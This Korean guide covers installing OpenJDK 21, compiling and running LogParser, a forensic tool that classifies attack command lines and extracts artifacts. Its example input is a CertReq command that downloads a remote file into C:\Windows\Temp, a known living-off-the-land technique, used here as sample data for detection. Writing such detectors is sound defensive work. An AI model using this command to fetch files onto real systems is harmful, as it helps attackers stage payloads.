# LogParser 사용 가이드

## 1. Java 21 설치 및 LogParser 컴파일

`LogParser`를 실행하려면 먼저 `LogParser.java`를 컴파일해야 합니다.

컴파일에는 `javac`가 필요하므로 **JRE가 아니라 JDK를 설치해야 합니다.** 이 문서는 RHEL·Rocky Linux와 Ubuntu에서 모두 **OpenJDK 21**을 사용하는 것을 기준으로 설명합니다.

### 1.1 Java 21 사용 권장

Java 21을 설치하여 사용하는 구성이 적절합니다.

* Java 21은 장기 지원 계열로 운영 환경에서 사용하기에 안정적입니다.
* RHEL·Rocky Linux 9와 Ubuntu 22.04에서 패키지 관리자를 이용해 설치할 수 있습니다.
* `LogParser`는 GUI가 필요 없는 명령행 프로그램이므로 Ubuntu에서는 `headless` JDK 패키지로 충분합니다.
* `javac`가 포함되지 않은 JRE 패키지만 설치하면 `LogParser.java`를 컴파일할 수 없습니다.

> **호환성 주의**  
> Java 21로 컴파일한 `.class` 파일은 원칙적으로 Java 21 이상의 런타임에서 실행해야 합니다. 컴파일 시스템과 실행 시스템의 Java 주 버전을 모두 21로 통일하는 것을 권장합니다.

### 1.2 현재 설치 상태 확인

다음 명령으로 `java`와 `javac`의 설치 여부를 확인합니다.

```bash
java -version
javac -version
```

다음과 같이 `command not found`가 출력되면 JDK를 설치해야 합니다.

```text
-bash: java: command not found
-bash: javac: command not found
```

---

### 1.3 RHEL·Rocky Linux 9에 OpenJDK 21 설치

RHEL 또는 Rocky Linux 9에서는 다음 패키지를 설치합니다.

```bash
sudo dnf install -y java-21-openjdk-devel
```

`root` 계정으로 접속한 경우에는 `sudo`를 제외할 수 있습니다.

```bash
dnf install -y java-21-openjdk-devel
```

설치 후 다음 명령으로 확인합니다.

```bash
java -version
javac -version
rpm -q java-21-openjdk-devel
```

정상 설치되면 `java`와 `javac`의 주 버전이 모두 `21`로 출력되어야 합니다.

```text
openjdk version "21.0.x" ...
javac 21.0.x
```

> **저장소 확인**  
> 패키지를 찾을 수 없으면 Rocky Linux에서는 AppStream 저장소가 활성화되어 있는지 확인합니다. RHEL에서는 시스템 등록과 AppStream 저장소 접근 권한이 필요할 수 있습니다.

사용 가능한 패키지는 다음과 같이 확인할 수 있습니다.

```bash
dnf list --available 'java-21-openjdk*'
```

---

### 1.4 Ubuntu 22.04에 OpenJDK 21 설치

`LogParser`는 명령행 프로그램이므로 GUI 관련 구성요소가 없는 `headless` JDK를 권장합니다.

```bash
sudo apt update
sudo apt install -y openjdk-21-jdk-headless
```

설치 후 다음 명령으로 확인합니다.

```bash
java -version
javac -version
dpkg -s openjdk-21-jdk-headless | grep -E '^(Package|Status|Version):'
```

정상 설치되면 `java`와 `javac`의 주 버전이 모두 `21`로 출력되어야 합니다.

```text
openjdk version "21.0.x" ...
javac 21.0.x
```

데스크톱 GUI 관련 Java 구성요소까지 필요한 경우에는 다음 전체 JDK 패키지를 사용할 수 있습니다.

```bash
sudo apt install -y openjdk-21-jdk
```

그러나 현재 `LogParser` 컴파일과 실행에는 `openjdk-21-jdk-headless`로 충분합니다.

패키지를 찾을 수 없으면 Ubuntu의 `universe` 저장소가 활성화되어 있는지 확인한 후 다시 설치합니다.

```bash
sudo apt install -y software-properties-common
sudo add-apt-repository -y universe
sudo apt update
sudo apt install -y openjdk-21-jdk-headless
```

---

### 1.5 여러 Java 버전이 설치된 경우

기존에 Java 11, 17 또는 다른 버전이 설치되어 있으면 `java`와 `javac`가 서로 다른 버전을 가리킬 수 있습니다. 두 명령 모두 Java 21을 사용하도록 선택해야 합니다.

#### RHEL·Rocky Linux

```bash
sudo alternatives --config java
sudo alternatives --config javac
```

#### Ubuntu

```bash
sudo update-alternatives --config java
sudo update-alternatives --config javac
```

선택 후 다시 확인합니다.

```bash
java -version
javac -version
```

두 결과 모두 `21`이어야 합니다.

실제 실행 파일 경로는 다음과 같이 확인할 수 있습니다.

```bash
readlink -f "$(command -v java)"
readlink -f "$(command -v javac)"
```

> `LogParser`를 단순히 컴파일하고 실행하는 경우에는 별도의 `JAVA_HOME` 설정이 필수는 아닙니다.

---

### 1.6 파일 배치 확인

다음 2개 파일이 같은 디렉터리에 있어야 합니다.

```text
LogParser.java
patterns.yml
```

`LogParser`는 실행 시 현재 디렉터리의 `patterns.yml` 파일을 읽어 Grok 패턴을 로드합니다. 따라서 `LogParser.class`가 생성된 위치에서 `patterns.yml`도 함께 확인되어야 합니다.

현재 디렉터리의 파일을 확인합니다.

```bash
ls -l LogParser.java patterns.yml
```

---

### 1.7 LogParser 컴파일

`LogParser.java`가 있는 디렉터리에서 다음 명령어를 실행합니다.

```bash
javac LogParser.java
```

컴파일이 정상적으로 완료되면 다음과 같은 `.class` 파일이 생성됩니다.

```text
LogParser.class
LogParser$GrokRule.class
```

생성 결과는 다음 명령으로 확인합니다.

```bash
ls -l LogParser*.class
```

컴파일 오류가 발생하지 않았는데 기존 `.class` 파일과 혼동될 가능성이 있으면 기존 파일을 삭제한 후 다시 컴파일합니다.

```bash
rm -f LogParser*.class
javac LogParser.java
```

---

### 1.8 컴파일 후 실행 구조

최종적으로 같은 디렉터리에 다음 파일들이 있으면 실행할 수 있습니다.

```text
LogParser.class
LogParser$GrokRule.class
patterns.yml
```

권장 디렉터리 구조는 다음과 같습니다.

```text
forensic/
├── LogParser.java
├── LogParser.class
├── LogParser$GrokRule.class
└── patterns.yml
```

실행 명령은 다음과 같습니다.

```bash
java LogParser "[분석할 로그 문자열]"
```

---

## 2. 개요

`LogParser`는 입력된 커맨드라인 로그를 분석하여 공격 유형을 분류하고, 시그니처를 탐지하며, 공격에 사용된 핵심 파일 경로 및 URL 등의 아티팩트를 추출하는 분석 도구입니다.

## 3. 사용 방법

커맨드라인에서 `java LogParser` 명령어 뒤에 분석하고자 하는 로그 문자열을 파라미터로 입력하여 실행합니다.

```bash
java LogParser "[분석할 로그 문자열]"
```

로그에 공백이나 특수문자가 포함될 수 있으므로 전체 로그 문자열을 큰따옴표로 감싸는 것을 권장합니다.

## 4. 실행 예시

다음은 `CertReq` 명령어를 악용한 파일 다운로드 공격 로그를 분석하는 예시입니다.

**입력 명령어:**

```bash
[root@Rocky9 forensic]# java LogParser "CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt"
```

**출력 결과:**

```text
[*] 입력된 로그: CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
========================================
[*] 공격 카테고리 : Download
[*] 탐지 시그니처 : DOWN_CERTREQ_1
----------------------------------------
[+] process : CertReq
[+] targetFile : https://www.example.org/file.ext
[+] targetFile2 : C:\Windows\Temp\file.ext
========================================
```

## 5. 핵심 결과 분석

출력된 결과 중 `[*]`로 표시된 디버깅 및 기본 분석 정보(공격 카테고리, 시그니처 등)를 제외했을 때, **가장 핵심이 되는 정보는 최종 목적지 파일 경로**입니다.

위 예시에서 공격자가 원격지(`targetFile`)에서 파일을 다운로드하여 로컬 시스템의 어느 위치에 저장하려고 했는지 다음 항목을 통해 명확히 확인할 수 있습니다.

* **`[+] targetFile2 : C:\Windows\Temp\file.ext`** *(이 경로는 시스템에 실제로 생성되거나 조작되는 대상 파일 위치를 나타내므로 침해사고 조사 시 가장 우선적으로 확인해야 합니다.)*

---
